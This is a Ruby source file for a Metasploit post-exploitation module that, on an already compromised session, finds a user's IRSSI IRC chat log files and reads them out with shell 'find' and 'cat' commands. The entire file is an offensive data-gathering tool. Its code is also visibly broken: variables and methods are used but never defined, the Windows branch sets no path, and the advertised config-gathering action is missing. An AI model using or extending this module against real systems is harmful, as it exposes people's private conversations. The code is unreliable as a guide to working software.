##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'Multi IRSSI Gather Enumeration',
			'Description'   => %q{
					This module works on multiple platforms and gathers config and log files for IRSSI IRC client.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'HenryHoggard'],
			'Platform'      => [ 'linux', 'osx', 'windows' ],
			'SessionTypes'  => [ "shell" ],
			'Actions'       =>
				[
					['CONFIG', { 'Description' => 'Gather all config files' } ],
					['LOGS',    { 'Description' => 'Gather all chat logs' } ],
					['ALL',      { 'Description' => 'Gather both config files and chat logs'}]
				],
			'DefaultAction' => 'ALL'
		))

	end

  def run
      paths = []
      user = whoami
      case session.platform
      
      when /unix|linux|bsd/
        @platform = :unix
        path = "/home/#{user}/irclogs/"
      when /osx/
        @platform = :osx
        path = "/Users/#{user}/irclogs/"
        
      when /win/
        @platform = :windows
      else
        print_error "Unsupported platform #{session.platform}"
        return
      end
      
      irclogs = get_logs(path)
      save(:irclogs, irclogs) if not irclogs.nil? and not irclogs.empty?
        
      
      
  end
  
  def whoami
      if @platform == :windows
        session.fs.file.expand_path("%USERNAME%")
      else
        session.shell_command("whoami").chomp
      end
  end
  
  
  def get_logs(path)
    logs = cmd_exec("find #{path} -name '*.log'")
    logs.split("\n").each do |l|
      print_status("#{peer} - Downloading#{l}")
      content = cmd_exec("cat #{l}")
      name = ::File.basename(l)
      irc_logs << {:log_name => name, :content => content}
    end
    return irc_logs
  end
    



end
    
    